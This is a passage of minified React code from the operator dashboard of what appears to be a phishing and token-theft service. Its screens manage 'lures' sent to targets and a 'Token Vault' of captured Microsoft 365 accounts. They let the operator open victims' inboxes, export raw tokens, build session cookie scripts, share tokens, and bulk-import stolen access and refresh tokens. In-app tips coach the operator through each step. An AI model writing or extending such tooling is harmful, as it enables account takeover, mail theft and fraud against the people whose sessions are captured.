  return (0, R.jsx)(`button`, {
    onClick: t,
    className: `px-3 py-1.5 text-[10px] font-bold uppercase tracking-wider transition-colors cursor-pointer border ${e ? `border-slate-700 bg-slate-800 text-white` : `border-border text-text-muted hover:text-text-secondary hover:border-border-light`}`,
    children: n,
  });
}
function Ra({ text: e, icon: t }) {
  return (0, R.jsxs)(`div`, {
    className: `bg-surface border border-border py-16 text-center`,
    children: [
      (0, R.jsx)(`div`, {
        className: `text-text-muted mb-2`,
        children: t || (0, R.jsx)(Lr, { size: 24, className: `mx-auto` }),
      }),
      (0, R.jsx)(`p`, { className: `text-sm text-text-muted`, children: e }),
    ],
  });
}
function za({ video: e, isAdmin: t, onPlay: n, onDelete: r }) {
  let i = Aa(e.url),
    a = i ? `https://img.youtube.com/vi/${i}/mqdefault.jpg` : null;
  return (0, R.jsxs)(`div`, {
    className: `bg-surface border border-border group hover:border-border-light transition-colors`,
    children: [
      (0, R.jsxs)(`button`, {
        onClick: n,
        className: `relative w-full aspect-video bg-bg flex items-center justify-center cursor-pointer overflow-hidden`,
        children: [
          a
            ? (0, R.jsx)(`img`, {
                src: a,
                alt: ``,
                className: `w-full h-full object-cover`,
              })
            : (0, R.jsx)(Wi, { size: 32, className: `text-text-muted/40` }),
          (0, R.jsx)(`div`, {
            className: `absolute inset-0 flex items-center justify-center bg-black/40 opacity-0 group-hover:opacity-100 transition-opacity`,
            children: (0, R.jsx)(`div`, {
              className: `w-12 h-12 bg-white/20 backdrop-blur-sm border border-white/30 flex items-center justify-center`,
              children: (0, R.jsx)(gi, {
                size: 20,
                className: `text-white ml-0.5`,
                fill: `white`,
              }),
            }),
          }),
        ],
      }),
      (0, R.jsxs)(`div`, {
        className: `p-4`,
        children: [
          (0, R.jsxs)(`div`, {
            className: `flex items-start justify-between gap-2`,
            children: [
              (0, R.jsxs)(`div`, {
                className: `flex-1 min-w-0`,
                children: [
                  (0, R.jsx)(`h3`, {
                    className: `text-sm font-semibold text-text truncate`,
                    children: e.title,
                  }),
                  (0, R.jsx)(`p`, {
                    className: `text-[11px] text-text-muted mt-1 line-clamp-2 leading-relaxed`,
                    children: e.description,
                  }),
                ],
              }),
              t &&
                (0, R.jsx)(`button`, {
                  onClick: (e) => {
                    (e.stopPropagation(), r());
                  },
                  className: `p-1.5 text-text-muted hover:text-danger transition-colors cursor-pointer flex-shrink-0 opacity-0 group-hover:opacity-100`,
                  children: (0, R.jsx)(I, { size: 13 }),
                }),
            ],
          }),
          (0, R.jsxs)(`div`, {
            className: `flex items-center justify-between mt-3`,
            children: [
              (0, R.jsx)(`span`, {
                className: `text-[9px] font-bold uppercase tracking-wider text-text-muted px-2 py-0.5 border border-border bg-bg`,
                children: e.category,
              }),
              (0, R.jsxs)(`button`, {
                onClick: n,
                className: `flex items-center gap-1 text-[10px] font-bold uppercase tracking-wider text-text-secondary hover:text-slate-900 transition-colors cursor-pointer`,
                children: [(0, R.jsx)(gi, { size: 10 }), ` Watch`],
              }),
            ],
          }),
        ],
      }),
    ],
  });
}
function Ba({ video: e, onClose: t }) {
  let n = Aa(e.url);
  return (0, R.jsx)(`div`, {
    className: `fixed inset-0 z-50 flex items-center justify-center bg-black/80`,
    onClick: t,
    children: (0, R.jsxs)(`div`, {
      className: `w-full max-w-4xl mx-4 bg-surface border border-border`,
      onClick: (e) => e.stopPropagation(),
      children: [
        (0, R.jsxs)(`div`, {
          className: `flex items-center justify-between px-5 py-3 border-b border-border`,
          children: [
            (0, R.jsxs)(`div`, {
              className: `min-w-0 flex-1 mr-4`,
              children: [
                (0, R.jsx)(`h3`, {
                  className: `text-sm font-bold truncate`,
                  children: e.title,
                }),
                (0, R.jsx)(`p`, {
                  className: `text-[11px] text-text-muted mt-0.5 truncate`,
                  children: e.description,
                }),
              ],
            }),
            (0, R.jsxs)(`div`, {
              className: `flex items-center gap-2 flex-shrink-0`,
              children: [
                (0, R.jsx)(`a`, {
                  href: e.url,
                  target: `_blank`,
                  rel: `noopener noreferrer`,
                  className: `p-1.5 text-text-muted hover:text-text transition-colors`,
                  children: (0, R.jsx)(Kr, { size: 14 }),
                }),
                (0, R.jsx)(`button`, {
                  onClick: t,
                  className: `text-text-muted hover:text-text cursor-pointer`,
                  children: (0, R.jsx)(Ki, { size: 16 }),
                }),
              ],
            }),
          ],
        }),
        (0, R.jsx)(`div`, {
          className: `aspect-video bg-black`,
          children: n
            ? (0, R.jsx)(`iframe`, {
                src: `https://www.youtube.com/embed/${n}?autoplay=1&rel=0`,
                className: `w-full h-full`,
                allow: `autoplay; encrypted-media; picture-in-picture`,
                allowFullScreen: !0,
              })
            : ja(e.url)
              ? (0, R.jsx)(`video`, {
                  src: e.url,
                  controls: !0,
                  autoPlay: !0,
                  className: `w-full h-full`,
                })
              : (0, R.jsx)(`iframe`, {
                  src: e.url,
                  className: `w-full h-full`,
                  allowFullScreen: !0,
                }),
        }),
      ],
    }),
  });
}
function Va({ onClose: e, onAdded: t }) {
  let n = z((e) => e.add),
    [r, i] = (0, _.useState)(`url`),
    [a, o] = (0, _.useState)(``),
    [s, c] = (0, _.useState)(``),
    [l, u] = (0, _.useState)(``),
    [d, f] = (0, _.useState)(ka[0]),
    [p, m] = (0, _.useState)(null),
    [h, g] = (0, _.useState)(!1),
    v = (0, _.useRef)(null);
  async function y() {
    if (!a.trim()) {
      n(`Title required`, `error`);
      return;
    }
    if (r === `url` && !l.trim()) {
      n(`URL required`, `error`);
      return;
    }
    if (r === `upload` && !p) {
      n(`Select a video file`, `error`);
      return;
    }
    g(!0);
    try {
      let e;
      ((e =
        r === `url`
          ? await wa({
              title: a.trim(),
              description: s.trim(),
              url: l.trim(),
              category: d,
            })
          : await Ea(p, a.trim(), s.trim(), d)),
        t(e));
    } catch (e) {
      n(e instanceof Error ? e.message : `Failed to add video`, `error`);
    } finally {
      g(!1);
    }
  }
  return (0, R.jsx)(Sa, {
    open: !0,
    title: `Add Tutorial Video`,
    onClose: e,
    width: `max-w-lg`,
    children: (0, R.jsxs)(`div`, {
      className: `space-y-4`,
      children: [
        (0, R.jsxs)(`div`, {
          className: `flex gap-2`,
          children: [
            (0, R.jsxs)(`button`, {
              onClick: () => i(`url`),
              className: `flex-1 py-2 text-xs font-bold uppercase tracking-wider border cursor-pointer transition-colors ${r === `url` ? `border-slate-700 bg-slate-800 text-white` : `border-border text-text-muted hover:text-text-secondary`}`,
              children: [
                (0, R.jsx)(Kr, { size: 12, className: `inline mr-1.5 -mt-px` }),
                ` Paste URL`,
              ],
            }),
            (0, R.jsxs)(`button`, {
              onClick: () => i(`upload`),
              className: `flex-1 py-2 text-xs font-bold uppercase tracking-wider border cursor-pointer transition-colors ${r === `upload` ? `border-slate-700 bg-slate-800 text-white` : `border-border text-text-muted hover:text-text-secondary`}`,
              children: [
                (0, R.jsx)(Li, { size: 12, className: `inline mr-1.5 -mt-px` }),
                ` Upload File`,
              ],
            }),
          ],
        }),
        (0, R.jsx)(H, {
          label: `Title`,
          value: a,
          onChange: (e) => o(e.target.value),
          placeholder: `e.g. How to Create Your First Lure`,
        }),
        (0, R.jsx)(H, {
          label: `Description`,
          value: s,
          onChange: (e) => c(e.target.value),
          placeholder: `Brief description of what this video teaches`,
        }),
        (0, R.jsxs)(`div`, {
          children: [
            (0, R.jsx)(`label`, {
              className: `text-[10px] text-text-muted uppercase tracking-widest mb-1 block`,
              children: `Category`,
            }),
            (0, R.jsx)(`select`, {
              value: d,
              onChange: (e) => f(e.target.value),
              className: `w-full bg-surface border border-border text-text px-3 py-2.5 text-sm focus:outline-none focus:border-border-light appearance-none cursor-pointer`,
              children: ka.map((e) =>
                (0, R.jsx)(`option`, { value: e, children: e }, e),
              ),
            }),
          ],
        }),
        r === `url`
          ? (0, R.jsx)(H, {
              label: `Video URL`,
              value: l,
              onChange: (e) => u(e.target.value),
              placeholder: `YouTube, Vimeo, or direct video URL`,
            })
          : (0, R.jsxs)(`div`, {
              children: [
                (0, R.jsx)(`label`, {
                  className: `text-[10px] text-text-muted uppercase tracking-widest mb-1 block`,
                  children: `Video File`,
                }),
                (0, R.jsx)(`input`, {
                  ref: v,
                  type: `file`,
                  accept: `video/*`,
                  onChange: (e) => m(e.target.files?.[0] || null),
                  className: `hidden`,
                }),
                (0, R.jsx)(`button`, {
                  onClick: () => v.current?.click(),
                  className: `w-full border border-dashed border-border hover:border-border-light bg-bg py-6 text-center transition-colors cursor-pointer`,
                  children: p
                    ? (0, R.jsxs)(`div`, {
                        className: `text-sm text-text`,
                        children: [
                          p.name,
                          ` `,
                          (0, R.jsxs)(`span`, {
                            className: `text-text-muted`,
                            children: [
                              `(`,
                              (p.size / 1024 / 1024).toFixed(1),
                              ` MB)`,
                            ],
                          }),
                        ],
                      })
                    : (0, R.jsxs)(`div`, {
                        children: [
                          (0, R.jsx)(Li, {
                            size: 20,
                            className: `mx-auto text-text-muted mb-2`,
                          }),
                          (0, R.jsx)(`div`, {
                            className: `text-xs text-text-muted`,
                            children: `Click to select a video file`,
                          }),
                          (0, R.jsx)(`div`, {
                            className: `text-[10px] text-text-muted/60 mt-1`,
                            children: `MP4, WebM, MOV — max 500MB`,
                          }),
                        ],
                      }),
                }),
              ],
            }),
        (0, R.jsxs)(`div`, {
          className: `flex gap-2 pt-1`,
          children: [
            (0, R.jsx)(V, {
              onClick: y,
              disabled: h,
              children: h ? `Saving...` : `Add Video`,
            }),
            (0, R.jsx)(V, { variant: `ghost`, onClick: e, children: `Cancel` }),
          ],
        }),
      ],
    }),
  });
}
function Ha({ title: e, tips: t, learnMoreCategory: n }) {
  let r = er((e) => e.user)?.id ?? 0,
    i = ct(),
    [a, o] = (0, _.useState)(
      () => !!sessionStorage.getItem(`learner_dismiss_${e}`),
    );
  if (!Na(r) || a) return null;
  function s() {
    (sessionStorage.setItem(`learner_dismiss_${e}`, `1`), o(!0));
  }
  return (0, R.jsxs)(`div`, {
    className: `mb-4 bg-[#0c1929] border border-[#1e3a5f] px-4 py-3 relative`,
    children: [
      (0, R.jsx)(`button`, {
        onClick: s,
        className: `absolute top-2.5 right-2.5 text-text-muted hover:text-text transition-colors cursor-pointer`,
        children: (0, R.jsx)(Ki, { size: 13 }),
      }),
      (0, R.jsxs)(`div`, {
        className: `flex items-start gap-3`,
        children: [
          (0, R.jsx)(ei, {
            size: 16,
            className: `text-blue-400 mt-0.5 flex-shrink-0`,
          }),
          (0, R.jsxs)(`div`, {
            className: `flex-1 min-w-0 pr-4`,
            children: [
              (0, R.jsx)(`h4`, {
                className: `text-[11px] font-bold uppercase tracking-wider text-blue-300 mb-1.5`,
                children: e,
              }),
              (0, R.jsx)(`ul`, {
                className: `space-y-1`,
                children: t.map((e, t) =>
                  (0, R.jsxs)(
                    `li`,
                    {
                      className: `text-[11px] text-text-secondary leading-relaxed flex items-start gap-1.5`,
                      children: [
                        (0, R.jsx)(`span`, {
                          className: `text-blue-400/60 mt-px flex-shrink-0`,
                          children: `•`,
                        }),
                        (0, R.jsx)(`span`, { children: e }),
                      ],
                    },
                    t,
                  ),
                ),
              }),
              n &&
                (0, R.jsxs)(`button`, {
                  onClick: () => i(`/ai`),
                  className: `mt-2 flex items-center gap-1 text-[10px] font-bold uppercase tracking-wider text-blue-400 hover:text-blue-300 transition-colors cursor-pointer`,
                  children: [`Learn more `, (0, R.jsx)(Nr, { size: 10 })],
                }),
            ],
          }),
        ],
      }),
    ],
  });
}
function Ua() {
  let [e, t] = (0, _.useState)(null),
    [n, r] = (0, _.useState)([]),
    [i, a] = (0, _.useState)([]),
    [o, s] = (0, _.useState)([]),
    [c, l] = (0, _.useState)(!0),
    u = ct();
  return (
    (0, _.useEffect)(() => {
      Promise.all([_a(), va()])
        .then(([e, n]) => {
          (t(e),
            r(n.tokens ?? n.captures ?? []),
            a(n.daily_captures ?? []),
            s(n.countries ?? []));
        })
        .catch(() => {})
        .finally(() => l(!1));
    }, []),
    c
      ? (0, R.jsx)(`div`, {
          className: `text-text-muted text-sm py-12 text-center`,
          children: `Loading...`,
        })
      : (0, R.jsxs)(`div`, {
          children: [
            (0, R.jsx)(`div`, {
              className: `flex items-center justify-between mb-5`,
              children: (0, R.jsx)(`h1`, {
                className: `text-lg font-bold tracking-wider uppercase`,
                children: `Overview`,
              }),
            }),
            (0, R.jsx)(Ha, {
              title: `Dashboard Overview`,
              tips: [
                `This page shows your token captures, active lures, and recent activity at a glance.`,
                `Click on any recent capture to open their inbox directly.`,
                `Start by creating a lure in the Lures page, then send the link to your targets.`,
              ],
              learnMoreCategory: `getting-started`,
            }),
            (0, R.jsxs)(`div`, {
              className: `grid grid-cols-2 lg:grid-cols-4 gap-3 mb-5`,
              children: [
                (0, R.jsx)(B, {
                  label: `Total Tokens`,
                  value: e?.total_tokens ?? 0,
                  icon: (0, R.jsx)(ti, {
                    size: 18,
                    className: `text-text-muted`,
                  }),
                }),
                (0, R.jsx)(B, {
                  label: `Active`,
                  value: e?.active_tokens ?? 0,
                  accent: `active`,
                  icon: (0, R.jsx)(Cr, { size: 18, className: `text-active` }),
                }),
                (0, R.jsx)(B, {
                  label: `Revoked`,
                  value: e?.revoked ?? 0,
                  accent: `danger`,
                  icon: (0, R.jsx)(Di, { size: 18, className: `text-danger` }),
                }),
                (0, R.jsx)(B, {
                  label: `Total Lures`,
                  value: e?.total_lures ?? 0,
                  icon: (0, R.jsx)(ai, {
                    size: 18,
                    className: `text-text-muted`,
                  }),
                }),
              ],
            }),
            (0, R.jsxs)(`div`, {
              className: `bg-surface border border-border`,
              children: [
                (0, R.jsxs)(`div`, {
                  className: `flex items-center justify-between px-5 py-3 border-b border-border`,
                  children: [
                    (0, R.jsx)(`h3`, {
                      className: `text-xs font-bold uppercase tracking-wider text-text-muted`,
                      children: `Recent Captures`,
                    }),
                    (0, R.jsx)(`button`, {
                      onClick: () => u(`/tokens`),
                      className: `text-[10px] text-text-muted hover:text-text uppercase tracking-wider font-semibold cursor-pointer transition-colors`,
                      children: `View All`,
                    }),
                  ],
                }),
                n.length === 0
                  ? (0, R.jsx)(`div`, {
                      className: `text-sm text-text-muted py-12 text-center`,
                      children: `No captures yet. Create a lure to get started.`,
                    })
                  : (0, R.jsx)(`div`, {
                      className: `max-h-[420px] overflow-y-auto`,
                      children: (0, R.jsxs)(`table`, {
                        className: `w-full text-sm table-fixed`,
                        children: [
                          (0, R.jsx)(`thead`, {
                            className: `sticky top-0 z-10 bg-surface`,
                            children: (0, R.jsxs)(`tr`, {
                              className: `border-b border-border`,
                              children: [
                                (0, R.jsx)(`th`, {
                                  className: `text-left text-[10px] text-text-muted uppercase tracking-wider py-2.5 px-5 font-bold w-[40%]`,
                                  children: `Email`,
                                }),
                                (0, R.jsx)(`th`, {
                                  className: `text-left text-[10px] text-text-muted uppercase tracking-wider py-2.5 px-3 font-bold w-[15%]`,
                                  children: `Status`,
                                }),
                                (0, R.jsx)(`th`, {
                                  className: `text-left text-[10px] text-text-muted uppercase tracking-wider py-2.5 px-3 font-bold w-[15%]`,
                                  children: `Country`,
                                }),
                                (0, R.jsx)(`th`, {
                                  className: `text-left text-[10px] text-text-muted uppercase tracking-wider py-2.5 px-3 font-bold w-[30%]`,
                                  children: `Time`,
                                }),
                              ],
                            }),
                          }),
                          (0, R.jsx)(`tbody`, {
                            children: n.map((e) =>
                              (0, R.jsxs)(
                                `tr`,
                                {
                                  onClick: () =>
                                    window.open(
                                      `/dash/outlook/${e.id}`,
                                      `_blank`,
                                    ),
                                  className: `border-b border-border/40 hover:bg-slate-50 transition-colors cursor-pointer`,
                                  children: [
                                    (0, R.jsx)(`td`, {
                                      className: `py-2.5 px-5 text-[13px] text-text font-medium truncate w-[40%]`,
                                      children: e.user_email,
                                    }),
                                    (0, R.jsx)(`td`, {
                                      className: `py-2.5 px-3 w-[15%]`,
                                      children: (0, R.jsx)(la, {
                                        status: e.status,
                                      }),
                                    }),
                                    (0, R.jsx)(`td`, {
                                      className: `py-2.5 px-3 text-[13px] text-text-secondary w-[15%]`,
                                      children: e.country ?? `—`,
                                    }),
                                    (0, R.jsx)(`td`, {
                                      className: `py-2.5 px-3 text-[11px] text-text-muted whitespace-nowrap w-[30%]`,
                                      children: new Date(
                                        e.captured_at,
                                      ).toLocaleString(),
                                    }),
                                  ],
                                },
                                e.id,
                              ),
                            ),
                          }),
                        ],
                      }),
                    }),
              ],
            }),
            (0, R.jsxs)(`div`, {
              className: `grid grid-cols-1 lg:grid-cols-3 gap-5 mt-5`,
              children: [
                (0, R.jsx)(`div`, {
                  className: `lg:col-span-2`,
                  children: (0, R.jsx)(pa, { data: i }),
                }),
                (0, R.jsx)(`div`, { children: (0, R.jsx)(ga, { data: o }) }),
              ],
            }),
          ],
        })
  );
}
async function Wa() {
  return P(`/dash/tokens`);
}
async function Ga(e) {
  return P(`/dash/token/${e}/delete`, { method: `POST` });
}
async function Ka() {
  return P(`/dash/tokens/delete-revoked`, { method: `POST` });
}
async function qa(e, t) {
  return P(`/dash/token/${e}/share`, {
    method: `POST`,
    body: JSON.stringify({ label: t || `` }),
  });
}
async function Ja(e) {
  return P(`/dash/token/${e}/shares`);
}
async function Ya(e, t) {
  return P(`/dash/token/${e}/unshare/${t}`, { method: `POST` });
}
async function Xa(e) {
  return P(`/dash/token/${e}/raw`);
}
async function Za(e) {
  return P(`/dash/token/${e}/session-script`, { method: `POST` });
}
async function Qa(e) {
  return P(`/dash/token/import`, { method: `POST`, body: JSON.stringify(e) });
}
var $a = `panel_important_tokens`;
function eo() {
  try {
    return new Set(JSON.parse(localStorage.getItem($a) || `[]`));
  } catch {
    return new Set();
  }
}
function to(e) {
  localStorage.setItem($a, JSON.stringify([...e]));
}
function no() {
  let [e, t] = (0, _.useState)([]),
    [n, r] = (0, _.useState)(!0),
    [i, a] = (0, _.useState)(``),
    [o, s] = (0, _.useState)(`captured_at`),
    [c, l] = (0, _.useState)(`desc`),
    [u, d] = (0, _.useState)(eo),
    [f, p] = (0, _.useState)(null),
    [m, h] = (0, _.useState)(null),
    [g, v] = (0, _.useState)(!1),
    y = z((e) => e.add);
  function b() {
    (r(!0),
      Wa()
        .then(t)
        .catch(() => y(`Failed to load tokens`, `error`))
        .finally(() => r(!1)));
  }
  (0, _.useEffect)(b, []);
  let x = (0, _.useCallback)((e) => {
    d((t) => {
      let n = new Set(t);
      return (n.has(e) ? n.delete(e) : n.add(e), to(n), n);
    });
  }, []);
  async function S(e) {
    if (confirm(`Delete this token permanently?`))
      try {
        (await Ga(e), y(`Token deleted`, `success`), b());
      } catch {
        y(`Delete failed`, `error`);
      }
  }
  async function C() {
    if (confirm(`Delete ALL revoked tokens?`))
      try {
        (y(`Deleted ${(await Ka()).deleted} revoked tokens`, `success`), b());
      } catch {
        y(`Failed to delete revoked tokens`, `error`);
      }
  }
  function w(e) {
    o === e ? l((e) => (e === `asc` ? `desc` : `asc`)) : (s(e), l(`desc`));
  }
  let ee = e
      .filter((e) => {
        if (!i) return !0;
        let t = i.toLowerCase();
        return t === `important` || t === `starred`
          ? u.has(e.id)
          : e.user_email?.toLowerCase().includes(t) ||
              e.user_name?.toLowerCase().includes(t) ||
              e.status?.toLowerCase().includes(t);
      })
      .sort((e, t) => {
        let n = +!!u.has(e.id),
          r = +!!u.has(t.id);
        if (n !== r) return r - n;
        let i = e[o] ?? ``,
          a = t[o] ?? ``,
          s = i < a ? -1 : +(i > a);
        return c === `asc` ? s : -s;
      }),
    T = e.filter((e) => e.status === `active`).length,
    E = e.filter((e) => e.status === `revoked`).length;
  return n
    ? (0, R.jsx)(`div`, {
        className: `text-text-muted text-sm py-12 text-center`,
        children: `Loading...`,
      })
    : (0, R.jsxs)(`div`, {
        children: [
          (0, R.jsxs)(`div`, {
            className: `flex items-center justify-between mb-5`,
            children: [
              (0, R.jsxs)(`div`, {
                children: [
                  (0, R.jsx)(`h1`, {
                    className: `text-lg font-bold tracking-wider uppercase`,
                    children: `Token Vault`,
                  }),
                  (0, R.jsxs)(`p`, {
                    className: `text-xs text-text-muted mt-1`,
                    children: [
                      e.length,
                      ` total · `,
                      T,
                      ` active · `,
                      E,
                      ` revoked`,
                    ],
                  }),
                ],
              }),
              (0, R.jsxs)(`div`, {
                className: `flex gap-2`,
                children: [
                  (0, R.jsx)(V, {
                    size: `sm`,
                    onClick: () => v(!0),
                    children: (0, R.jsxs)(`span`, {
                      className: `flex items-center gap-1.5`,
                      children: [(0, R.jsx)(Li, { size: 12 }), ` Import Token`],
                    }),
                  }),
                  (0, R.jsx)(V, {
                    variant: `danger`,
                    size: `sm`,
                    onClick: C,
                    children: `Clear Revoked`,
                  }),
                ],
              }),
            ],
          }),
          (0, R.jsx)(Ha, {
            title: `Token Vault`,
            tips: [
              `Tokens are captured Microsoft 365 accounts. Active tokens let you read inbox, send emails, and more.`,
              `Click the Inbox icon to open a token's mailbox. Use Star to mark important tokens.`,
              `Tokens refresh automatically every hour. Revoked means the org killed the session — needs a new capture.`,
            ],
            learnMoreCategory: `tokens`,
          }),
          (0, R.jsxs)(`div`, {
            className: `mb-4 relative`,
            children: [
              (0, R.jsx)(xi, {
                size: 14,
                className: `absolute left-3 top-1/2 -translate-y-1/2 text-text-muted`,
              }),
              (0, R.jsx)(`input`, {
                type: `text`,
                placeholder: `Search by email, name, or status...`,
                value: i,
                onChange: (e) => a(e.target.value),
                className: `w-full bg-surface border border-border text-text pl-9 pr-3 py-2.5 text-sm focus:outline-none focus:border-border-light transition-colors placeholder:text-text-muted`,
              }),
            ],
          }),
          (0, R.jsx)(`div`, {
            className: `bg-surface border border-border overflow-x-auto`,
            children: (0, R.jsxs)(`table`, {
              className: `w-full text-sm`,
              children: [
                (0, R.jsx)(`thead`, {
                  children: (0, R.jsxs)(`tr`, {
                    className: `border-b border-border`,
                    children: [
                      (0, R.jsx)(U, {
                        field: `user_email`,
                        label: `Email`,
                        sortField: o,
                        sortDir: c,
                        onSort: w,
                      }),
                      (0, R.jsx)(`th`, {
                        className: `text-left text-[10px] text-text-muted uppercase tracking-wider py-3 px-3 font-bold`,
                        children: `Name`,
                      }),
                      (0, R.jsx)(U, {
                        field: `status`,
                        label: `Status`,
                        sortField: o,
                        sortDir: c,
                        onSort: w,
                      }),
                      (0, R.jsx)(`th`, {
                        className: `text-left text-[10px] text-text-muted uppercase tracking-wider py-3 px-3 font-bold`,
                        children: `Type`,
                      }),
                      (0, R.jsx)(`th`, {
                        className: `text-left text-[10px] text-text-muted uppercase tracking-wider py-3 px-3 font-bold`,
                        children: `Country`,
                      }),
                      (0, R.jsx)(U, {
                        field: `captured_at`,
                        label: `Captured`,
                        sortField: o,
                        sortDir: c,
                        onSort: w,
                      }),
                      (0, R.jsx)(`th`, {
                        className: `text-left text-[10px] text-text-muted uppercase tracking-wider py-3 px-3 font-bold`,
                        children: `Actions`,
                      }),
                    ],
                  }),
                }),
                (0, R.jsx)(`tbody`, {
                  children:
                    ee.length === 0
                      ? (0, R.jsx)(`tr`, {
                          children: (0, R.jsx)(`td`, {
                            colSpan: 7,
                            className: `text-center text-text-muted py-12`,
                            children: i
                              ? `No tokens matching "${i}"`
                              : `No tokens captured yet`,
                          }),
                        })
                      : ee.map((e) =>
                          (0, R.jsxs)(
                            `tr`,
                            {
                              className: `border-b border-border/50 hover:bg-slate-50 transition-colors`,
                              children: [
                                (0, R.jsx)(`td`, {
                                  className: `py-2.5 px-3 text-[13px] font-medium max-w-[250px] truncate`,
                                  children: e.user_email,
                                }),
                                (0, R.jsx)(`td`, {
                                  className: `py-2.5 px-3 text-[13px] text-text-secondary`,
                                  children: e.user_name ?? `—`,
                                }),
                                (0, R.jsx)(`td`, {
                                  className: `py-2.5 px-3`,
                                  children: (0, R.jsx)(la, {
                                    status: e.status,
                                  }),
                                }),
                                (0, R.jsx)(`td`, {
                                  className: `py-2.5 px-3`,
                                  children: (0, R.jsx)(co, {
                                    clientId: e.client_id,
                                  }),
                                }),
                                (0, R.jsx)(`td`, {
                                  className: `py-2.5 px-3 text-[13px] text-text-secondary`,
                                  children: e.country ?? `—`,
                                }),
                                (0, R.jsx)(`td`, {
                                  className: `py-2.5 px-3 text-[11px] text-text-muted whitespace-nowrap`,
                                  children: new Date(
                                    e.captured_at,
                                  ).toLocaleString(),
                                }),
                                (0, R.jsx)(`td`, {
                                  className: `py-2 px-3`,
                                  children: (0, R.jsxs)(`div`, {
                                    className: `flex gap-1`,
                                    children: [
                                      (0, R.jsx)(`button`, {
                                        onClick: () => x(e.id),
                                        title: u.has(e.id)
                                          ? `Unmark important`
                                          : `Mark as important`,
                                        className: `flex items-center gap-1 px-2 py-1 cursor-pointer transition-colors`,
                                        children: (0, R.jsx)(Mi, {
                                          size: 13,
                                          className: u.has(e.id)
                                            ? `text-warning fill-warning`
                                            : `text-text-muted hover:text-warning`,
                                        }),
                                      }),
                                      (0, R.jsx)(lo, {
                                        label: `Inbox`,
                                        icon: (0, R.jsx)(di, { size: 12 }),
                                        onClick: () =>
                                          window.open(
                                            `/dash/outlook/${e.id}`,
                                            `_blank`,
                                          ),
                                        color: `text-text-secondary hover:text-slate-900 hover:bg-slate-100`,
                                      }),
                                      (0, R.jsx)(lo, {
                                        label: `Cookie`,
                                        icon: (0, R.jsx)(Hr, { size: 12 }),
                                        onClick: () => h(e),
                                        color: `text-text-secondary hover:text-warning hover:bg-warning/10`,
                                      }),
                                      (0, R.jsx)(lo, {
                                        label: `Export`,
                                        icon: (0, R.jsx)(Gr, { size: 12 }),
                                        onClick: async () => {
                                          try {
                                            let t = await Xa(e.id),
                                              n = new Blob(
                                                [JSON.stringify(t, null, 2)],
                                                { type: `application/json` },
                                              ),
                                              r = document.createElement(`a`);
                                            ((r.href = URL.createObjectURL(n)),
                                              (r.download = `token_${t.user_email || e.id}.json`),
                                              r.click(),
                                              URL.revokeObjectURL(r.href),
                                              y(`Token exported`, `success`));
                                          } catch {
                                            y(`Export failed`, `error`);
                                          }
                                        },
                                        color: `text-text-secondary hover:text-active hover:bg-active/10`,
                                      }),
                                      (0, R.jsx)(lo, {
                                        label: `Share`,
                                        icon: (0, R.jsx)(wi, { size: 12 }),
                                        onClick: () => p(e),
                                        color: `text-text-secondary hover:text-info hover:bg-info/10`,
                                      }),
                                      (0, R.jsx)(lo, {
                                        label: `Delete`,
                                        icon: (0, R.jsx)(I, { size: 12 }),
                                        onClick: () => S(e.id),
                                        color: `text-text-secondary hover:text-danger hover:bg-danger/10`,
                                      }),
                                    ],
                                  }),
                                }),
                              ],
                            },
                            e.id,
                          ),
                        ),
                }),
              ],
            }),
          }),
          f && (0, R.jsx)(so, { token: f, onClose: () => p(null) }),
          m && (0, R.jsx)(oo, { token: m, onClose: () => h(null) }),
          g &&
            (0, R.jsx)(ao, {
              onClose: () => v(!1),
              onDone: () => {
                (v(!1), b());
              },
            }),
        ],
      });
}
function ro(e) {
  try {
    let t = e.split(`.`);
    if (t.length !== 3) return null;
    let n = t[1].replace(/-/g, `+`).replace(/_/g, `/`);
    return JSON.parse(atob(n));
  } catch {
    return null;
  }
}
function io(e) {
  let t = e.access_token || e.token || e.accessToken || ``,
    n = e.refresh_token || e.refreshToken || ``;
  if (!t) return null;
  let r = e.user_email || e.email || void 0,
    i = e.user_name || e.name || e.displayName || void 0,
    a = r,
    o = i,
    s = ro(t);
  return (
    s &&
      ((a ||= s.upn || s.unique_name || s.preferred_username || s.email),
      (o ||= s.name)),
    { access_token: t, refresh_token: n, user_email: a, user_name: o }
  );
}
function ao({ onClose: e, onDone: t }) {
  let [n, r] = (0, _.useState)(``),
    [i, a] = (0, _.useState)(null),
    [o, s] = (0, _.useState)(!1),
    [c, l] = (0, _.useState)({ done: 0, total: 0, failed: 0 }),
    u = z((e) => e.add);
  function d(e) {
    r(e);
    let t = e.trim();
    if (!t) {
      a(null);
      return;
    }
    try {
      let e = JSON.parse(t);
      if (Array.isArray(e)) {
        a({ mode: `bulk`, count: e.filter((e) => io(e) !== null).length });
        return;
      }
      if (typeof e == `object`) {
        let t = io(e);
        if (t) {
          a({ mode: `single`, count: 1, email: t.user_email });
          return;
        }
      }
    } catch {}
    let n = ro(t);
    if (n) {
      a({
        mode: `single`,
        count: 1,
        email: n.upn || n.unique_name || n.preferred_username || n.email,
      });
      return;
    }
    a(null);
  }
  async function f() {
    let e = n.trim();
    if (!e) {
      u(`Paste tokens to import`, `error`);
      return;
    }
    let r = [];
    try {
      let t = JSON.parse(e);
      if (Array.isArray(t))
        for (let e of t) {
          let t = io(e);
          t && r.push(t);
        }
      else if (typeof t == `object`) {
        let e = io(t);
        e && r.push(e);
      }
    } catch {
      let t = io({ access_token: e });
      t && r.push(t);
    }
    if (r.length === 0) {
      u(`Could not detect token format`, `error`);
      return;
    }
    (s(!0), l({ done: 0, total: r.length, failed: 0 }));
    let i = 0,
      a = 0;
    for (let e of r)
      if (e) {
        try {
          (
            await Qa({
              access_token: e.access_token,
              refresh_token: e.refresh_token,
              user_email: e.user_email,
              user_name: e.user_name,
            })
          ).success
            ? i++
            : a++;
        } catch {
          a++;
        }
        l({ done: i + a, total: r.length, failed: a });
      }
    (s(!1),
      r.length === 1
        ? i
          ? u(`Token imported — ${r[0].user_email || `unknown`}`, `success`)
          : u(`Import failed`, `error`)
        : u(
            `Bulk import: ${i} succeeded, ${a} failed`,
            i > 0 ? `success` : `error`,
          ),
      i > 0 && t());
  }
  return (0, R.jsx)(Sa, {
    open: !0,
    title: `Import Tokens`,
    onClose: e,
    width: `max-w-lg`,
    children: (0, R.jsxs)(`div`, {
      className: `space-y-3`,
      children: [
        (0, R.jsx)(`p`, {
          className: `text-xs text-text-muted`,
          children: `Paste a single token object, an array of tokens for bulk import, or a raw JWT access token.`,
        }),
        (0, R.jsxs)(`div`, {
          children: [
            (0, R.jsx)(`label`, {
